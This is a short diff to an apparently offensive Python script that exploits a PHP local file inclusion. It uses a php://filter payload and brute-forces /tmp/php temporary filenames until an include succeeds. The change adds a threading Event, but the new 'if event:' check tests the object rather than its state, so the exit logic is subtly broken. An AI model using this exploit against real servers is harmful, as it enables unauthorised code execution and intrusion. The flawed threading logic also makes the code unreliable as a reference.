@@ -17,6 +17,7 @@ PAYLOAD2 = "php://filter/string.strip_tags/resource=index.php"
 
 # charset = string.digits + string.ascii_letters
 charset = string.ascii_letters
+event = threading.Event()
 
 
 def upload_file_to_include():
@@ -46,6 +47,8 @@ def brute_force_tmp_file(charset):
                             if 'phpok' in r.text:
                                 print("\033[32m[+] Include success!\033[0m")
                                 print(f"The filename is /tmp/php{suffix}")
+                                event.set()
+                            if event:
                                 sys.exit(0)
 
 
